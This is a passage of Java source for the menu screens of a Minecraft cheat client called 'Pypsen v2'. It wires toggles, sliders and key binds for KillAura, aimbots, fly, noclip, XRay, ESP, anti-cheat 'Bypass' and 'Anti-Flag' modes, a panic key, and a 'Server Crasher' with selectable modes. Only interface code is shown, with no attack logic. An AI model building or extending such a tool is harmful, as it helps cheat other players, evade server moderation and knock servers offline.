            addDrawableChild(cycleBtn(x, y, w, "Mode", FREEZE_MODES, freezeMode, v -> { freezeMode = v; rebuild(); })); y += 26;

            y = section(x, y, w, "AirJump", airJumpOn, b -> { airJumpOn = !airJumpOn; rebuild(); }, keyAirJump, 25);
            addDrawableChild(cycleBtn(x, y, w, "Mode", AIRJUMP_MODES, airJumpMode, v -> { airJumpMode = v; rebuild(); })); y += 26;

            y = section(x, y, w, "NoFall", noFallOn, b -> { noFallOn = !noFallOn; rebuild(); }, keyNoFall, 26);
            addDrawableChild(cycleBtn(x, y, w, "Mode", NOFALL_MODES, noFallMode, v -> { noFallMode = v; rebuild(); })); y += 26;

            y = section(x, y, w, "Jesus", jesusOn, b -> { jesusOn = !jesusOn; rebuild(); }, keyJesus, 27);
            addDrawableChild(cycleBtn(x, y, w, "Mode", JESUS_MODES, jesusMode, v -> { jesusMode = v; rebuild(); })); y += 26;

            y = section(x, y, w, "Speed", speedOn, b -> { speedOn = !speedOn; rebuild(); }, keySpeed, 0);
            addDrawableChild(slider(x, y, w, "Speed", 0.1f, 100f, speedVal, v -> speedVal = v)); y += 22;
            addDrawableChild(cycleBtn(x, y, w, "Bypass", BYPASS_NAMES, speedBypass, v -> { speedBypass = v; rebuild(); })); y += 26;

            y = section(x, y, w, "Fly", flyOn, b -> { flyOn = !flyOn; rebuild(); }, keyFly, 3);
            addDrawableChild(slider(x, y, w, "Fly Speed", 0.1f, 50f, flySpeed, v -> flySpeed = v)); y += 22;
            addDrawableChild(cycleBtn(x, y, w, "Bypass", BYPASS_NAMES, flyBypass, v -> { flyBypass = v; rebuild(); })); y += 26;

            y = section(x, y, w, "XRay", xrayOn, b -> { xrayOn = !xrayOn; MinecraftClient.getInstance().worldRenderer.reload(); rebuild(); }, keyXray, 4);
            addDrawableChild(ButtonWidget.builder(Text.literal("Select XRay Blocks..."), b -> {
                MinecraftClient.getInstance().setScreen(new XrayScreen(this));
            }).dimensions(x, y, w, 20).build()); y += 26;

            y = section(x, y, w, "HUD Settings", hudOn, b -> { hudOn = !hudOn; rebuild(); }, GLFW.GLFW_KEY_UNKNOWN, -1);
            addDrawableChild(ButtonWidget.builder(Text.literal("Target HUD: " + (targetHudOn ? "§aON" : "§cOFF")), b -> { targetHudOn = !targetHudOn; rebuild(); }).dimensions(x, y, w, 20).build()); y += 26;

            y = section(x, y, w, "Server Crasher", serverCrasherOn, b -> { serverCrasherOn = !serverCrasherOn; rebuild(); }, keyCrasher, 21);
            addDrawableChild(cycleBtn(x, y, w, "Mode", CRASHER_MODES, crasherMode, v -> { crasherMode = v; rebuild(); })); y += 22;
            addDrawableChild(cycleBtn(x, y, w, "Timer", CRASHER_TIMERS, crasherTimerMode, v -> { crasherTimerMode = v; rebuild(); })); y += 26;

            y = section(x, y, w, "GodMode", godModeOn, b -> { godModeOn = !godModeOn; rebuild(); }, keyGodMode, 22);
            addDrawableChild(cycleBtn(x, y, w, "Mode", GODMODE_MODES, godModeMode, v -> { godModeMode = v; rebuild(); })); y += 26;
            y = section(x, y, w, "AutoArmor", autoArmorOn, b -> { autoArmorOn = !autoArmorOn; rebuild(); }, keyAutoArmor, 23); y += 4;

            y = section(x, y, w, "FastBow", fastBowOn, b -> { fastBowOn = !fastBowOn; rebuild(); }, keyFastBow, 24);
            addDrawableChild(ButtonWidget.builder(Text.literal("BowJump: " + (bowJump ? "§aON" : "§cOFF")), b -> { bowJump = !bowJump; rebuild(); }).dimensions(x, y, w, 20).build()); y += 26;

            addDrawableChild(ButtonWidget.builder(Text.literal("Drop All Items"), b -> { dropAllItems = true; }).dimensions(x, y, w, 20).build()); y += 26;

            addDrawableChild(bindBtn(x, y, w, "Panic Key", keyPanic, 14)); y += 22;
            addDrawableChild(bindBtn(x, y, w, "Menu Key", keyMenu, 9));
        }

        private int section(int x, int y, int w, String name, boolean on, java.util.function.Consumer<ButtonWidget> toggle, int key, int bindId) {
            int halfW = w / 2 - 2;
            addDrawableChild(ButtonWidget.builder(Text.literal(name + ": " + (on ? "\u00a7aON" : "\u00a7cOFF")), b -> toggle.accept(b)).dimensions(x, y, halfW, 20).build());
            if (bindId != -1) {
                addDrawableChild(bindBtn(x + halfW + 4, y, halfW, "Key", key, bindId));
            }
            return y + 22;
        }

        private ButtonWidget bindBtn(int x, int y, int w, String label, int key, int id) {
            String text = (bindingTarget == id) ? label + ": \u00a7e[...]" : label + ": \u00a7f" + keyName(key);
            return ButtonWidget.builder(Text.literal(text), b -> { bindingTarget = id; rebuild(); }).dimensions(x, y, w, 20).build();
        }

        private ButtonWidget cycleBtn(int x, int y, int w, String label, String[] options, int current, java.util.function.Consumer<Integer> setter) {
            return ButtonWidget.builder(Text.literal(label + ": \u00a7b" + options[current]), b -> setter.accept((current + 1) % options.length)).dimensions(x, y, w, 20).build();
        }

        @Override
        public boolean keyPressed(int keyCode, int scanCode, int modifiers) {
            if (bindingTarget >= 0 && keyCode != GLFW.GLFW_KEY_ESCAPE) {
                switch (bindingTarget) {
                    case 0 -> keySpeed       = keyCode;
                    case 1 -> keyAura        = keyCode;
                    case 2 -> keyHitbox      = keyCode;
                    case 3 -> keyFly         = keyCode;
                    case 4 -> keyXray        = keyCode;
                    case 5 -> keyVelocity    = keyCode;
                    case 6 -> keyAim         = keyCode;
                    case 7 -> keyStrafe      = keyCode;
                    case 8 -> keyVisuals     = keyCode;
                    case 9 -> keyMenu        = keyCode;
                    case 10 -> keyAutoClicker= keyCode;
                    case 11 -> keyNoclip     = keyCode;
                    case 12 -> keyAntiFlag   = keyCode;
                    case 13 -> keyTriggerBot = keyCode;
                    case 14 -> keyPanic      = keyCode;
                    case 15 -> keyFreecam    = keyCode;
                    case 16 -> keyAutoTotem  = keyCode;
                    case 17 -> keyAimLock    = keyCode;
                    case 18 -> keySpider     = keyCode;
                    case 19 -> keyNoWeb      = keyCode;
                    case 20 -> keyFreeze     = keyCode;
                    case 21 -> keyCrasher    = keyCode;
                    case 22 -> keyGodMode    = keyCode;
                    case 23 -> keyAutoArmor  = keyCode;
                    case 24 -> keyFastBow    = keyCode;
                    case 25 -> keyAirJump    = keyCode;
                    case 26 -> keyNoFall     = keyCode;
                    case 27 -> keyJesus      = keyCode;
                }
                bindingTarget = -1;
                rebuild();
                return true;
            }
            if (keyCode == GLFW.GLFW_KEY_ESCAPE && bindingTarget >= 0) {
                bindingTarget = -1;
                rebuild();
                return true;
            }
            return super.keyPressed(keyCode, scanCode, modifiers);
        }

        @Override
        public boolean mouseScrolled(double mouseX, double mouseY, double amount) {
            if (bindingTarget >= 0) {
                switch (bindingTarget) {
                    case 0 -> keySpeed       = GLFW.GLFW_KEY_UNKNOWN;
                    case 1 -> keyAura        = GLFW.GLFW_KEY_UNKNOWN;
                    case 2 -> keyHitbox      = GLFW.GLFW_KEY_UNKNOWN;
                    case 3 -> keyFly         = GLFW.GLFW_KEY_UNKNOWN;
                    case 4 -> keyXray        = GLFW.GLFW_KEY_UNKNOWN;
                    case 5 -> keyVelocity    = GLFW.GLFW_KEY_UNKNOWN;
                    case 6 -> keyAim         = GLFW.GLFW_KEY_UNKNOWN;
                    case 7 -> keyStrafe      = GLFW.GLFW_KEY_UNKNOWN;
                    case 8 -> keyVisuals     = GLFW.GLFW_KEY_UNKNOWN;
                    case 9 -> keyMenu        = GLFW.GLFW_KEY_UNKNOWN;
                    case 10 -> keyAutoClicker= GLFW.GLFW_KEY_UNKNOWN;
                    case 11 -> keyNoclip     = GLFW.GLFW_KEY_UNKNOWN;
                    case 12 -> keyAntiFlag   = GLFW.GLFW_KEY_UNKNOWN;
                    case 13 -> keyTriggerBot = GLFW.GLFW_KEY_UNKNOWN;
                    case 14 -> keyPanic      = GLFW.GLFW_KEY_UNKNOWN;
                    case 15 -> keyFreecam    = GLFW.GLFW_KEY_UNKNOWN;
                    case 16 -> keyAutoTotem  = GLFW.GLFW_KEY_UNKNOWN;
                    case 17 -> keyAimLock    = GLFW.GLFW_KEY_UNKNOWN;
                    case 18 -> keySpider     = GLFW.GLFW_KEY_UNKNOWN;
                    case 19 -> keyNoWeb      = GLFW.GLFW_KEY_UNKNOWN;
                    case 20 -> keyFreeze     = GLFW.GLFW_KEY_UNKNOWN;
                    case 21 -> keyCrasher    = GLFW.GLFW_KEY_UNKNOWN;
                    case 22 -> keyGodMode    = GLFW.GLFW_KEY_UNKNOWN;
                    case 23 -> keyAutoArmor  = GLFW.GLFW_KEY_UNKNOWN;
                    case 24 -> keyFastBow    = GLFW.GLFW_KEY_UNKNOWN;
                    case 25 -> keyAirJump    = GLFW.GLFW_KEY_UNKNOWN;
                    case 26 -> keyNoFall     = GLFW.GLFW_KEY_UNKNOWN;
                    case 27 -> keyJesus      = GLFW.GLFW_KEY_UNKNOWN;
                }
                bindingTarget = -1;
                rebuild();
                return true;
            }

            scroll += (int)(amount * 25);
            if (scroll > 0) scroll = 0;
            rebuild();
            return true;
        }

        @Override
        public void render(DrawContext ctx, int mx, int my, float d) {
            renderBackground(ctx);
            ctx.drawCenteredTextWithShadow(textRenderer, "\u00a7a\u00a7l\u2588 Pypsen v2 \u2588", width / 2, 10, 0x55FF55);
            super.render(ctx, mx, my, d);
        }

        @Override public boolean shouldPause() { return false; }

        private void rebuild() {
            buildWidgets();
        }
    }

    // ══════════ MODERN GUI SCREEN ══════════
    public static class ModernGuiScreen extends Screen {
        public static int[] cX = {20, 180, 340, 500};
        public static int[] cY = {40, 40, 40, 40};
        public static Set<String> expanded = new HashSet<>();
        private int[] curY = new int[4];
        private int dragging = -1;
        private int dragX, dragY;
        private int bindingTarget = -1;

        public ModernGuiScreen() { super(Text.literal("Modern GUI")); }

        @Override
        protected void init() {
            addDrawableChild(ButtonWidget.builder(Text.literal("§c◀ Back to Classic GUI"), b -> {
                useModernGui = false;
                if (client != null) client.setScreen(new MenuScreen());
            }).dimensions(5, 5, 150, 20).build());

            curY = new int[]{20, 20, 20, 20};

            // Combat
            addMod(0, "KillAura", auraOn, v->auraOn=v, () -> {
                addS(0, "Range", 1f, 20f, auraRange, v->auraRange=v);
                addC(0, "Mode", AURA_MODES, auraMode, v->auraMode=v);
                addC(0, "Target", AURA_TARGETS, auraTargetMode, v->auraTargetMode=v);
                addC(0, "Rotation", AURA_ROTS, auraRotMode, v->auraRotMode=v);
                addC(0, "Timing", AURA_TIMINGS, auraTimingMode, v->auraTimingMode=v);
                addC(0, "Aim Part", AURA_PARTS, auraTargetPart, v->auraTargetPart=v);
                addS(0, "Aim Jitter", 0f, 1f, auraAimJitter, v->auraAimJitter=v);
                addS(0, "Stickiness", 0f, 100f, auraStickiness, v->auraStickiness=v);
                addS(0, "Rot Curve", 0f, 100f, auraRotCurve, v->auraRotCurve=v);
                addS(0, "Rot Speed", 1f, 180f, auraRotSpeed, v->auraRotSpeed=v);
                addS(0, "FOV", 10f, 360f, auraFov, v->auraFov=v);
                addB(0, "Predict", auraPredict, v->auraPredict=v);
                addB(0, "Randomize", auraRandomize, v->auraRandomize=v);
                addC(0, "Bypass", BYPASS_NAMES, auraBypass, v->auraBypass=v);
                addB(0, "Target Players", auraTargetPlayers, v->auraTargetPlayers=v);
                addB(0, "Target Mobs", auraTargetMobs, v->auraTargetMobs=v);
                addB(0, "Target Animals", auraTargetAnimals, v->auraTargetAnimals=v);
                addB(0, "AutoWeapon", autoWeapon, v->autoWeapon=v);
                addB(0, "Criticals", criticals, v->criticals=v);
                addB(0, "Water Crits", waterCrits, v->waterCrits=v);
                addB(0, "Jump & Attack", auraJump, v->auraJump=v);
                addB(0, "Through Walls", auraThroughWalls, v->auraThroughWalls=v);
                addB(0, "Hit in GUIs", auraHitInGuis, v->auraHitInGuis=v);
                addB(0, "AntiBot", antiBotOn, v->antiBotOn=v);
                addB(0, "SpinBot (Idle)", auraSpinBot, v->auraSpinBot=v);
                addBind(0, "Bind", 1);
            });
            addMod(0, "AutoClicker", autoClickerOn, v->autoClickerOn=v, () -> {
                addS(0, "CPS", 1f, 50f, clickerCps, v->clickerCps=v);
                addB(0, "Right Click", autoClickerRight, v->autoClickerRight=v);
                addB(0, "Farm Mode", autoClickerFarm, v->autoClickerFarm=v);
            });
            addMod(0, "TriggerBot", triggerBotOn, v->triggerBotOn=v, () -> {
                addS(0, "CPS", 1f, 50f, triggerCps, v->triggerCps=v);
                addS(0, "Range", 1f, 6f, triggerRange, v->triggerRange=v);
                addB(0, "Weapon Only", triggerWeaponOnly, v->triggerWeaponOnly=v);
            });
            addMod(0, "AutoTotem", autoTotemOn, v->autoTotemOn=v, () -> {
                addS(0, "Health", 1f, 20f, autoTotemHealth, v->autoTotemHealth=v);
                addC(0, "Mode", TOTEM_MODES, autoTotemMode, v->autoTotemMode=v);
            });
            addMod(0, "AutoArmor", autoArmorOn, v->autoArmorOn=v, null);
            addMod(0, "FastBow", fastBowOn, v->fastBowOn=v, () -> {
                addB(0, "BowJump", bowJump, v->bowJump=v);
            });
            addMod(0, "AimAssist", aimOn, v->aimOn=v, () -> {
                addS(0, "Smooth Speed", 1f, 100f, aimSpeed, v->aimSpeed=v);
            });
            addMod(0, "AimLock", aimLockOn, v->aimLockOn=v, null);
            addMod(0, "Hitbox", hitboxOn, v->hitboxOn=v, () -> {
                addS(0, "Size", 0.1f, 1000f, hitboxVal, v->hitboxVal=v);
            });
            addMod(0, "AntiBot", antiBotOn, v->antiBotOn=v, null);

            // Movement
            addMod(1, "Speed", speedOn, v->speedOn=v, () -> {
                addS(1, "Speed", 0.1f, 100f, speedVal, v->speedVal=v);
                addC(1, "Bypass", BYPASS_NAMES, speedBypass, v->speedBypass=v);
            });
            addMod(1, "Fly", flyOn, v->flyOn=v, () -> {
                addS(1, "Speed", 0.1f, 50f, flySpeed, v->flySpeed=v);
                addC(1, "Bypass", BYPASS_NAMES, flyBypass, v->flyBypass=v);
            });
            addMod(1, "Spider", spiderOn, v->spiderOn=v, () -> {
                addC(1, "Mode", SPIDER_MODES, spiderMode, v->spiderMode=v);
            });
            addMod(1, "NoWeb", noWebOn, v->noWebOn=v, () -> {
                addC(1, "Mode", NOWEB_MODES, noWebMode, v->noWebMode=v);
            });
            addMod(1, "Freeze", freezeOn, v->freezeOn=v, () -> {
                addC(1, "Mode", FREEZE_MODES, freezeMode, v->freezeMode=v);
                addBind(1, "Bind", 20);
            });
            addMod(1, "AirJump", airJumpOn, v->airJumpOn=v, () -> {
                addC(1, "Mode", AIRJUMP_MODES, airJumpMode, v->airJumpMode=v);
                addBind(1, "Bind", 25);
            });
            addMod(1, "NoFall", noFallOn, v->noFallOn=v, () -> {
                addC(1, "Mode", NOFALL_MODES, noFallMode, v->noFallMode=v);
                addBind(1, "Bind", 26);
            });
            addMod(1, "Jesus", jesusOn, v->jesusOn=v, () -> {
                addC(1, "Mode", JESUS_MODES, jesusMode, v->jesusMode=v);
                addBind(1, "Bind", 27);
            });
            addMod(1, "Noclip", noclipOn, v->noclipOn=v, () -> {
                addC(1, "Mode", NOCLIP_MODES, noclipBypass, v->noclipBypass=v);
                addBind(1, "Bind", 11);
            });
            addMod(1, "Velocity", velocityOn, v->velocityOn=v, () -> {
                addC(1, "Mode", VELOCITY_MODES, velocityMode, v->velocityMode=v);
            });
            addMod(1, "Strafe", strafeOn, v->strafeOn=v, null);
            addMod(1, "Anti-Flag", antiFlagOn, v->antiFlagOn=v, null);

            // Visuals
            addMod(2, "XRay", xrayOn, v->{xrayOn=v; if(client!=null)client.worldRenderer.reload();}, () -> {
                addDrawableChild(ButtonWidget.builder(Text.literal("Select Blocks..."), b -> {
                    if(client!=null) client.setScreen(new XrayScreen(this));
                }).dimensions(cX[2] + 5, cY[2] + curY[2], 140, 20).build());
                curY[2] += 22;
            });
            addMod(2, "Glowing ESP", visualsOn, v->visualsOn=v, () -> {
                addC(2, "Target", VISUALS_TARGETS, visualsTargetMode, v->visualsTargetMode=v);
                addBind(2, "Bind", 8);
            });
            addMod(2, "Target HUD", targetHudOn, v->targetHudOn=v, null);
            addMod(2, "Player ESP", playerEspOn, v->playerEspOn=v, null);
            addMod(2, "FullBright", fullBrightOn, v->fullBrightOn=v, null);
            addMod(2, "NameHider", nameHiderOn, v->nameHiderOn=v, null);
            addMod(2, "See Invis", seeInvisOn, v->seeInvisOn=v, null);
            addMod(2, "Target ESP", targetEspOn, v->targetEspOn=v, null);
            addMod(2, "No Fire", noFireOn, v->noFireOn=v, null);
            addMod(2, "No Nausea", noNauseaOn, v->noNauseaOn=v, null);
            addMod(2, "NoHurtCam", noHurtCamOn, v->noHurtCamOn=v, null);

            // Misc
            addMod(3, "Freecam", freecamOn, v->{
                freecamOn=v;
                if (client != null && client.player != null) {
                    if (freecamOn) {
                        freecamPos = client.player.getPos();
                        freecamYaw = client.player.getYaw();
                        freecamPitch = client.player.getPitch();
                    } else {
                        client.player.noClip = false;
                        client.player.getAbilities().flying = false;
                        if (freecamPos != null) {
                            client.player.setPosition(freecamPos);
                            client.player.setYaw(freecamYaw);
                            client.player.setPitch(freecamPitch);
                            client.player.setVelocity(0, 0, 0);
                        }
                    }
                }
            }, null);
            addMod(3, "GodMode", godModeOn, v->godModeOn=v, () -> {
                addC(3, "Mode", GODMODE_MODES, godModeMode, v->godModeMode=v);
                addBind(3, "Bind", 22);
            });
            addMod(3, "Server Crasher", serverCrasherOn, v->serverCrasherOn=v, () -> {
                addC(3, "Mode", CRASHER_MODES, crasherMode, v->crasherMode=v);
                addC(3, "Timer", CRASHER_TIMERS, crasherTimerMode, v->crasherTimerMode=v);
            });
            addDrawableChild(ButtonWidget.builder(Text.literal("Drop All Items"), b -> { dropAllItems = true; }).dimensions(cX[3], cY[3] + curY[3], 150, 20).build()); curY[3]+=22;
            addMod(3, "Panic", panicOn, v->panicOn=v, null);
        }

        private void addMod(int col, String name, boolean val, java.util.function.Consumer<Boolean> act, Runnable settings) {
            int x = cX[col];
            int y = cY[col] + curY[col];
            int w = settings != null ? 130 : 150;
            addDrawableChild(ButtonWidget.builder(Text.literal(name + ": " + (val?"§aON":"§cOFF")), b -> { act.accept(!val); rebuild(); }).dimensions(x, y, w, 20).build());
            if (settings != null) {
                boolean isExp = expanded.contains(name);
                addDrawableChild(ButtonWidget.builder(Text.literal(isExp ? "-" : "+"), b -> {
                    if (isExp) expanded.remove(name); else expanded.add(name);
                    rebuild();
                }).dimensions(x + 130, y, 20, 20).build());
                curY[col] += 22;
                if (isExp) {
                    settings.run();
                }
            } else {
                curY[col] += 22;
            }
        }

        private void addS(int col, String label, float min, float max, float val, java.util.function.Consumer<Float> setter) {
            addDrawableChild(slider(cX[col] + 5, cY[col] + curY[col], 140, label, min, max, val, v -> setter.accept(v)));
            curY[col] += 22;
        }

        private void addC(int col, String label, String[] options, int current, java.util.function.Consumer<Integer> setter) {
            addDrawableChild(ButtonWidget.builder(Text.literal(label + ": §b" + options[current]), b -> { setter.accept((current + 1) % options.length); rebuild(); }).dimensions(cX[col] + 5, cY[col] + curY[col], 140, 20).build());
            curY[col] += 22;
        }

        private void addB(int col, String label, boolean val, java.util.function.Consumer<Boolean> act) {
            addDrawableChild(ButtonWidget.builder(Text.literal(label + ": " + (val?"§aON":"§cOFF")), b -> { act.accept(!val); rebuild(); }).dimensions(cX[col] + 5, cY[col] + curY[col], 140, 20).build());
            curY[col] += 22;
        }

        private int getKeyCode(int id) {
            return switch(id) {
                case 0 -> keySpeed; case 1 -> keyAura; case 2 -> keyHitbox; case 3 -> keyFly;
                case 4 -> keyXray; case 5 -> keyVelocity; case 6 -> keyAim; case 7 -> keyStrafe;
                case 8 -> keyVisuals; case 9 -> keyMenu; case 10 -> keyAutoClicker; case 11 -> keyNoclip;
                case 12 -> keyAntiFlag; case 13 -> keyTriggerBot; case 14 -> keyPanic; case 15 -> keyFreecam;
                case 16 -> keyAutoTotem; case 17 -> keyAimLock; case 18 -> keySpider; case 19 -> keyNoWeb;
                case 20 -> keyFreeze; case 21 -> keyCrasher; case 22 -> keyGodMode; case 23 -> keyAutoArmor;
                case 24 -> keyFastBow; case 25 -> keyAirJump; case 26 -> keyNoFall; case 27 -> keyJesus;
                default -> GLFW.GLFW_KEY_UNKNOWN;
            };
        }

        private void addBind(int col, String label, int keyId) {
            int currentKey = getKeyCode(keyId);
            String text = (bindingTarget == keyId) ? label + ": §e[...]" : label + ": §f" + keyName(currentKey);
            addDrawableChild(ButtonWidget.builder(Text.literal(text), b -> { bindingTarget = keyId; rebuild(); }).dimensions(cX[col] + 5, cY[col] + curY[col], 140, 20).build());
            curY[col] += 22;
        }

        @Override
        public boolean mouseClicked(double mx, double my, int button) {
            if (bindingTarget != -1) {
                if (button == 2) { // Middle click to unbind
                    switch (bindingTarget) {
                        case 0 -> keySpeed = GLFW.GLFW_KEY_UNKNOWN; case 1 -> keyAura = GLFW.GLFW_KEY_UNKNOWN;
                        case 2 -> keyHitbox = GLFW.GLFW_KEY_UNKNOWN; case 3 -> keyFly = GLFW.GLFW_KEY_UNKNOWN;
                        case 4 -> keyXray = GLFW.GLFW_KEY_UNKNOWN; case 5 -> keyVelocity = GLFW.GLFW_KEY_UNKNOWN;
                        case 6 -> keyAim = GLFW.GLFW_KEY_UNKNOWN; case 7 -> keyStrafe = GLFW.GLFW_KEY_UNKNOWN;
                        case 8 -> keyVisuals = GLFW.GLFW_KEY_UNKNOWN; case 9 -> keyMenu = GLFW.GLFW_KEY_UNKNOWN;
                        case 10 -> keyAutoClicker = GLFW.GLFW_KEY_UNKNOWN; case 11 -> keyNoclip = GLFW.GLFW_KEY_UNKNOWN;
                        case 12 -> keyAntiFlag = GLFW.GLFW_KEY_UNKNOWN; case 13 -> keyTriggerBot = GLFW.GLFW_KEY_UNKNOWN;
                        case 14 -> keyPanic = GLFW.GLFW_KEY_UNKNOWN; case 15 -> keyFreecam = GLFW.GLFW_KEY_UNKNOWN;
                        case 16 -> keyAutoTotem = GLFW.GLFW_KEY_UNKNOWN; case 17 -> keyAimLock = GLFW.GLFW_KEY_UNKNOWN;
                        case 18 -> keySpider = GLFW.GLFW_KEY_UNKNOWN; case 19 -> keyNoWeb = GLFW.GLFW_KEY_UNKNOWN;
                        case 20 -> keyFreeze = GLFW.GLFW_KEY_UNKNOWN; case 21 -> keyCrasher = GLFW.GLFW_KEY_UNKNOWN;
                        case 22 -> keyGodMode = GLFW.GLFW_KEY_UNKNOWN; case 23 -> keyAutoArmor = GLFW.GLFW_KEY_UNKNOWN;
                        case 24 -> keyFastBow = GLFW.GLFW_KEY_UNKNOWN; case 25 -> keyAirJump = GLFW.GLFW_KEY_UNKNOWN;
                        case 26 -> keyNoFall = GLFW.GLFW_KEY_UNKNOWN; case 27 -> keyJesus = GLFW.GLFW_KEY_UNKNOWN;
                    }
                    bindingTarget = -1;
                    rebuild();
                    return true;
                }
            }
            for (int i = 0; i < 4; i++) {
                if (mx >= cX[i] && mx <= cX[i] + 150 && my >= cY[i] && my <= cY[i] + 20) {
                    dragging = i;
                    dragX = (int)mx - cX[i];
                    dragY = (int)my - cY[i];
                    return true;
                }
            }
            return super.mouseClicked(mx, my, button);
        }

        @Override
        public boolean mouseDragged(double mx, double my, int button, double dx, double dy) {
            if (dragging >= 0) {
                cX[dragging] = (int)mx - dragX;
                cY[dragging] = (int)my - dragY;
                rebuild();
                return true;
            }
            return super.mouseDragged(mx, my, button, dx, dy);
        }

        @Override
        public boolean mouseReleased(double mx, double my, int button) {
            dragging = -1;
            return super.mouseReleased(mx, my, button);
        }

        @Override
        public boolean keyPressed(int keyCode, int scanCode, int modifiers) {
            if (bindingTarget != -1) {
                if (keyCode == GLFW.GLFW_KEY_ESCAPE) {
                    bindingTarget = -1;
                    rebuild();
                    return true;
                }
                switch (bindingTarget) {
                    case 0 -> keySpeed = keyCode; case 1 -> keyAura = keyCode;
                    case 2 -> keyHitbox = keyCode; case 3 -> keyFly = keyCode;
                    case 4 -> keyXray = keyCode; case 5 -> keyVelocity = keyCode;
                    case 6 -> keyAim = keyCode; case 7 -> keyStrafe = keyCode;
                    case 8 -> keyVisuals = keyCode; case 9 -> keyMenu = keyCode;
                    case 10 -> keyAutoClicker = keyCode; case 11 -> keyNoclip = keyCode;
                    case 12 -> keyAntiFlag = keyCode; case 13 -> keyTriggerBot = keyCode;
                    case 14 -> keyPanic = keyCode; case 15 -> keyFreecam = keyCode;
                    case 16 -> keyAutoTotem = keyCode; case 17 -> keyAimLock = keyCode;
                    case 18 -> keySpider = keyCode; case 19 -> keyNoWeb = keyCode;
                    case 20 -> keyFreeze = keyCode; case 21 -> keyCrasher = keyCode;
                    case 22 -> keyGodMode = keyCode; case 23 -> keyAutoArmor = keyCode;
                    case 24 -> keyFastBow = keyCode; case 25 -> keyAirJump = keyCode;
                    case 26 -> keyNoFall = keyCode; case 27 -> keyJesus = keyCode;
                }
                bindingTarget = -1;
                rebuild();
                return true;
            }
            return super.keyPressed(keyCode, scanCode, modifiers);
        }

        @Override
        public void render(DrawContext ctx, int mx, int my, float d) {
            renderBackground(ctx);
            String[] titles = {"§c⚔ Combat", "§b✈ Movement", "§d✨ Visuals", "§7⚙ Misc"};
            for (int i = 0; i < 4; i++) {
                ctx.fill(cX[i], cY[i], cX[i] + 150, cY[i] + 20, 0xFF222222); // Header
                ctx.fill(cX[i], cY[i] + 20, cX[i] + 150, cY[i] + curY[i] + 4, 0xAA000000); // Body
                ctx.drawTextWithShadow(textRenderer, Text.literal(titles[i]), cX[i] + 5, cY[i] + 6, 0xFFFFFF);
            }
            super.render(ctx, mx, my, d);
        }

        @Override public boolean shouldPause() { return false; }
        private void rebuild() { clearChildren(); init(); }
    }

    private static SliderWidget slider(int x, int y, int w, String label, float min, float max, float cur, java.util.function.Consumer<Float> cb) {
        return new SliderWidget(x, y, w, 20, Text.literal(String.format("%s: %.1f", label, cur)), (cur - min) / (max - min)) {
            @Override protected void updateMessage() { setMessage(Text.literal(String.format("%s: %.1f", label, min + value * (max - min)))); }
            @Override protected void applyValue() { cb.accept((float)(min + value * (max - min))); }
        };
    }
}
